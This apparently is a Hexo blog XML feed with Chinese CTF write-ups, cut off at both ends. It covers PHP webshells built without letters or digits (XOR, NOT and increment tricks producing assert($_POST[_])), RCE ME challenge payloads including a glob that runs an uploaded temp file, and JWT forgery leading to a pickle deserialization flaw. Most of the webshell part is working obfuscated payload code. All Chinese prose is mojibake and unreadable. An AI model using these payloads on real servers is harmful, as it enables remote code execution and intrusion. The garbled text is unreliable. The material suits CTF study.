<span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<span class="hljs-keyword">for</span>($k=<span class="hljs-number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>;$i &lt; <span class="hljs-number">9</span>; $i++)&#123;        <span class="hljs-keyword">for</span>($j = <span class="hljs-number">0</span>;$j &lt;=<span class="hljs-number">9</span>;$j++)&#123;            $exp = $payload[$k] ^ $i.$j;            <span class="hljs-keyword">echo</span>($payload[$k].<span class="hljs-string">&quot;^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-subst">$exp</span>&quot;</span>);            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;        &#125;    &#125;&#125;</code></pre><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/20175211lyz/p/11588219.html#%E6%80%9D%E8%B7%AF%E4%BA%8C">https://www.cnblogs.com/20175211lyz/p/11588219.html#æ€è·¯äºŒ</a></p>]]></content>
    
    
    <categories>
      
      <category>åˆ·é¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>Ruby ERBæ¨¡æ¿æ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ— å­—æ¯æ•°å­—shell</title>
    <link href="/2021/07/26/shell-1/"/>
    <url>/2021/07/26/shell-1/</url>
    
    <content type="html"><![CDATA[<h2 id="åˆçº§"><a class="header-anchor" href="#åˆçº§">ğŸ­</a>åˆçº§</h2><p>å½“é¢˜ç›®æŠŠæ•°å­—å’Œå­—æ¯ç¦æ‰ï¼Œå¸¸è§„çš„shellå°±ç”¨ä¸äº†ï¼›å¦‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;  <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;shell&#x27;</span>]);&#125;</code></pre><h4 id="æ€è·¯"><a class="header-anchor" href="#æ€è·¯">ğŸ­</a>æ€è·¯</h4><p>å°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢æ„é€ å‡ºa-zä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚</p><h4 id="æ³•ä¸€ï¼šå¼‚æˆ–"><a class="header-anchor" href="#æ³•ä¸€ï¼šå¼‚æˆ–">ğŸ­</a>æ³•ä¸€ï¼šå¼‚æˆ–</h4><p>åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$_=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span>$__=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span>$___=$$__;$_($___[_]); <span class="hljs-comment">// assert($_POST[_]);</span></code></pre><p>æµ‹è¯•ï¼š</p><p><img src="/2021/07/26/shell-1/1.png" alt="1"></p><p>ä¹Ÿå¯æ„é€ ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>@$_++; <span class="hljs-comment">//$_=NULL=0  $_++=1</span>$__=(<span class="hljs-string">&quot;#&quot;</span>^<span class="hljs-string">&quot;|&quot;</span>).(<span class="hljs-string">&quot;.&quot;</span>^<span class="hljs-string">&quot;~&quot;</span>).(<span class="hljs-string">&quot;/&quot;</span>^<span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;|&quot;</span>^<span class="hljs-string">&quot;/&quot;</span>).(<span class="hljs-string">&quot;&#123;&quot;</span>^<span class="hljs-string">&quot;/&quot;</span>); <span class="hljs-comment">//_POST</span>$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="hljs-comment">// $_POST[0]($_POST[1]);</span><span class="hljs-meta">?&gt;</span></code></pre><p>å­—ç¬¦ä¹Ÿå¯ä»¥ä¸€èµ·å¼‚æˆ–ä½¿ç”¨</p><pre><code class="hljs awk">var_dump(<span class="hljs-string">&quot;#./|&#123;&quot;</span>^<span class="hljs-string">&quot;|~`//&quot;</span>); <span class="hljs-regexp">//</span>_POSTvar_dump(<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>); <span class="hljs-regexp">//</span>_GET</code></pre><h4 id="æ³•äºŒï¼šå–å"><a class="header-anchor" href="#æ³•äºŒï¼šå–å">ğŸ­</a>æ³•äºŒï¼šå–å</h4><p>UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼š</p><p><img src="/2021/07/26/shell-1/2.jpg" alt="2"></p><p>æ„é€ ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$__=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>); <span class="hljs-comment">//True+True=2;$__=2åˆ©ç”¨PHPçš„å¼±ç±»å‹ç‰¹æ€§</span>$_=$__/$__; <span class="hljs-comment">//$_=2/2=1</span>$____=<span class="hljs-string">&#x27;&#x27;</span>;$___=<span class="hljs-string">&quot;ç°&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="hljs-string">&quot;å’Œ&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="hljs-string">&quot;å’Œ&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="hljs-string">&quot;çš„&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="hljs-string">&quot;åŠ&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="hljs-string">&quot;å§‹&quot;</span>;$____.=~($___&#123;$__&#125;);$_____=<span class="hljs-string">&#x27;_&#x27;</span>;$___=<span class="hljs-string">&quot;ä¿¯&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="hljs-string">&quot;ç°&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="hljs-string">&quot;æ¬¡&quot;</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="hljs-string">&quot;ç«™&quot;</span>;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);<span class="hljs-meta">?&gt;</span></code></pre><p>æµ‹è¯•</p><img src="/2021/07/26/shell-1/2.png" alt="2" style="zoom: 50%;"><h4 id="æ³•ä¸‰"><a class="header-anchor" href="#æ³•ä¸‰">ğŸ­</a>æ³•ä¸‰</h4><p>åœ¨å¤„ç†å­—ç¬¦å˜é‡çš„ç®—æ•°è¿ç®—æ—¶ï¼ŒPHP æ²¿è¢­äº† Perl çš„ä¹ æƒ¯ï¼Œè€Œé C çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨    Perl ä¸­ <code>$a = 'Z'; $a++;</code> å°†æŠŠ <code>$a</code>    å˜æˆ<code>'AA'</code>ï¼Œè€Œåœ¨ C ä¸­ï¼Œ<code>a = 'Z'; a++;</code> å°†æŠŠ    <code>a</code> å˜æˆ <code>'['</code>ï¼ˆ<code>'Z'</code>    çš„ ASCII å€¼æ˜¯ 90ï¼Œ<code>'['</code> çš„ ASCII å€¼æ˜¯    91ï¼‰ã€‚æ³¨æ„å­—ç¬¦å˜é‡åªèƒ½é€’å¢ï¼Œä¸èƒ½é€’å‡ï¼Œå¹¶ä¸”åªæ”¯æŒçº¯å­—æ¯ï¼ˆa-z å’Œ    A-Zï¼‰ã€‚é€’å¢ï¼é€’å‡å…¶ä»–å­—ç¬¦å˜é‡åˆ™æ— æ•ˆï¼ŒåŸå­—ç¬¦ä¸²æ²¡æœ‰å˜åŒ–ã€‚<a href="https://www.php.net/manual/zh/language.operators.increment.php">å®˜æ–¹æ–‡æ¡£</a></p><p>==&gt;<code>'a'++ =&gt; 'b'</code>ï¼Œ<code>'b'++ =&gt; 'c'</code> æ‰€ä»¥æˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸º<code>a</code>ï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚æ•°ç»„ï¼ˆArrayï¼‰çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™Aï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™aã€‚åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸º<code>Array</code>ï¼š</p><p><img src="/2021/07/26/shell-1/3.png" alt="3"></p><p>æ„é€ ï¼š</p><pre><code class="hljs awk">&lt;?php<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;$_&quot;</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;Array&#x27;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-regexp">//</span> A<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-regexp">//</span> S<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-regexp">//</span> S<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> E <span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> R<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> T<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> P<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> O<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> S<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> T<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-regexp">//</span> ASSERT(<span class="hljs-variable">$_POST</span>[_]);</code></pre><h2 id="è¿›é˜¶"><a class="header-anchor" href="#è¿›é˜¶">ğŸ­</a>è¿›é˜¶</h2><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a class="header-anchor" href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME">ğŸ­</a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">if</span>(strlen($code)&gt;<span class="hljs-number">35</span>)&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Long.&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);    &#125;    <span class="hljs-keyword">eval</span>($code);&#125;<span class="hljs-keyword">else</span>&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><h4 id="php7"><a class="header-anchor" href="#php7">ğŸ­</a>php7</h4><p>php7.xä¸­è¡¨è¾¾å¼çš„æ‰§è¡Œé¡ºåº:<a href="https://www.php.net/manual/zh/migration70.incompatible.php">å®˜æ–¹æ–‡æ¡£</a></p><p><img src="/2021/07/26/shell-1/4.png" alt="4"></p><p>PHP7å‰ä¸å…è®¸ç”¨<code>($a)();</code>æ‰§è¡ŒåŠ¨æ€å‡½æ•°ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>('phpinfo')();</code>æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚æ„é€ ä¸€ä¸ªå¯ä»¥ç”Ÿæˆ<code>phpinfo</code>è¿™ä¸ªå­—ç¬¦ä¸²çš„PHPè¡¨è¾¾å¼å³å¯ã€‚payloadå¦‚ä¸‹ï¼ˆä¸å¯è§å­—ç¬¦ç”¨urlç¼–ç è¡¨ç¤ºï¼‰ï¼š</p><pre><code class="hljs angelscript">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();</code></pre><h4 id="php5"><a class="header-anchor" href="#php5">ğŸ­</a>php5</h4><p>è€ƒè™‘ç”¨â€œåå¼•å·â€+â€œshellâ€çš„æ–¹å¼getshellã€‚</p><p>Linux shellçŸ¥è¯†ç‚¹ï¼š</p><ul><li>shellä¸‹å¯ä»¥åˆ©ç”¨<code>.</code>æ¥æ‰§è¡Œä»»æ„è„šæœ¬</li><li>Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿</li></ul><p>periodçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼šç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™<code>. file</code>çš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥åˆ©ç”¨<code>.</code>æ¥æ‰§è¡Œï¼Œè¿™ä¸ªæ–‡ä»¶ä¹Ÿå¾ˆå¥½å¾—åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ï¼Œæ‰§è¡Œ<code>. /tmp/phpXXXXXX</code>ï¼Œä¹Ÿæœ‰å­—æ¯ã€‚</p><p>Linuxä¸‹çš„globé€šé…ç¬¦ï¼š</p><ul><li><code>*</code>å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦</li><li><code>?</code>å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</li></ul><p><code> /tmp/phpXXXXXX</code>å°±å¯ä»¥è¡¨ç¤ºä¸º<code>/*/?????????</code>æˆ–<code>/???/?????????</code>ï¼Œä½†èƒ½å¤ŸåŒ¹é…ä¸Šè¿™ä¸ªé€šé…ç¬¦çš„æ–‡ä»¶æœ‰å¾ˆå¤šã€‚</p><h5 id="globé€šé…ç¬¦"><a class="header-anchor" href="#globé€šé…ç¬¦">ğŸ­</a>globé€šé…ç¬¦</h5><p>globæ”¯æŒç”¨<code>[^x]</code>çš„æ–¹æ³•æ¥æ„é€ â€œè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ã€‚æˆ‘ä»¬ç”¨å®ƒæ’é™¤å…¶å®ƒæ–‡ä»¶ï¼Œä½†å½“å­˜åœ¨ä¸€äº›æ–‡ä»¶åä¸­éƒ½ä¸åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œå°±æ— æ³•æ’é™¤äº†ã€‚æŸ¥çœ‹<a href="https://man7.org/linux/man-pages/man7/glob.7.html">æ–‡æ¡£</a>å‘ç°</p><p><img src="/2021/07/26/shell-1/5.png" alt="5"></p><p>globæ”¯æŒåˆ©ç”¨<code>[0-9]</code>æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ã€‚è€Œæ‰€æœ‰æ–‡ä»¶åéƒ½æ˜¯å°å†™ï¼Œåªæœ‰PHPç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å¤§å†™å­—æ¯ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è¡¨ç¤ºâ€œå¤§å†™å­—æ¯â€çš„globé€šé…ç¬¦ï¼Œå°±èƒ½æ‰¾åˆ°æˆ‘ä»¬è¦æ‰§è¡Œçš„æ–‡ä»¶ã€‚asciiç è¡¨ä¸­å¤§å†™å­—æ¯ä½äº<code>@</code>ä¸<code>[</code>é—´ï¼Œå°±å¯ç”¨<code>[@-[]</code>æ¥è¡¨ç¤ºå¤§å†™å­—æ¯ã€‚æ•…ä¸Šé¢˜æˆ‘ä»¬ä¼ å…¥</p><pre><code class="hljs ruby"><span class="hljs-meta">?&gt;</span>&lt;?=<span class="hljs-string">`. /???/????????[@-[]`</span>;?&gt;</code></pre><p>å³å¯RCEã€‚</p><p>æ³¨ï¼šphpç”Ÿæˆä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯å¤§å†™å­—æ¯ï¼Œéœ€è¦å¤šå°è¯•å‡ æ¬¡ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>]]></content>
    
    
    <categories>
      
      <category>shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu</title>
    <link href="/2021/07/24/ikun/"/>
    <url>/2021/07/24/ikun/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a class="header-anchor" href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun">ğŸ­</a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>é¢˜ç›®æç¤ºè¦lv6ï¼Œç¿»äº†å‡ é¡µæ‰¾ä¸åˆ°ï¼Œç”¨è„šæœ¬è·‘</p><p><img src="/2021/07/24/ikun/1.png" alt="1"></p><p>ä½™é¢ä¸å¤Ÿï¼ŒæŠ“åŒ…æ”¹ä¸€ä¸‹æŠ˜æ‰£ï¼ŒæˆåŠŸè´­ä¹°ï¼Œéœ€è¦adminæƒé™ï¼Œå¯åˆ©ç”¨JWTä¼ªé€ adminèº«ä»½ï¼ŒJWTè§£ç </p><p><img src="/2021/07/24/ikun/2.png" alt="2"></p><p>éœ€è¦å…ˆçˆ†ç ´å¯†é’¥</p><p><img src="/2021/07/24/ikun/4.png" alt="4"></p><p>ä¼ªé€ JWT</p><p><img src="/2021/07/24/ikun/5.png" alt="5"></p><p>æŠ“åŒ…ä¿®æ”¹</p><p><img src="/2021/07/24/ikun/3.png" alt="3"></p><p>å¾—åˆ°æºç ,åœ¨admin.pyé‡Œå‘ç°pythonååºåˆ—åŒ–</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> urllib<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span>(<span class="hljs-params">BaseHandler</span>):</span><span class="hljs-meta">    @tornado.web.authenticated</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<span class="hljs-meta">    @tornado.web.authenticated</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):</span>        <span class="hljs-keyword">try</span>:            become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)            p = pickle.loads(urllib.unquote(become))            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)        <span class="hljs-keyword">except</span>:            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span 